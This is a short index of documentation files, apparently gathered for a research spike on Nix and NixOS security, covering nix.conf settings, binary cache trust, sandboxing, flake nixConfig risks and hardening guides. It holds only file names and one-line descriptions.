- `docs/nix-conf-security-settings.md` -- nix.conf security settings reference (Nix 2.19)
- `docs/garnix-stop-trusting-nix-caches.md` -- Garnix analysis of binary cache trust risks
- `docs/nix-multi-user-mode.md` -- Nix multi-user daemon architecture
- `docs/nix-sandboxing-discourse.md` -- Nix sandboxing technical details
- `docs/nixconfig-flake-security-risks.md` -- nixConfig flake security risks analysis
- `docs/determinate-nix-security.md` -- Determinate Systems security model
- `docs/tweag-untrusted-ci-binary-cache.md` -- Tweag untrusted CI binary caching
- `docs/devenv-binary-caching.md` -- devenv binary caching documentation
- `docs/devenv-flake-nix-config.md` -- devenv's flake.nix nixConfig settings
- `docs/hardening-nixos-guide.md` -- NixOS hardening guide
- `docs/nix-mineral-readme.md` -- nix-mineral NixOS security module
- `docs/nix-security-mechanisms-research.md` -- Phase 1 Nix security mechanisms analysis (this spike)
- `docs/config-options-research.md` -- Phase 1 configuration options inventory (this spike)
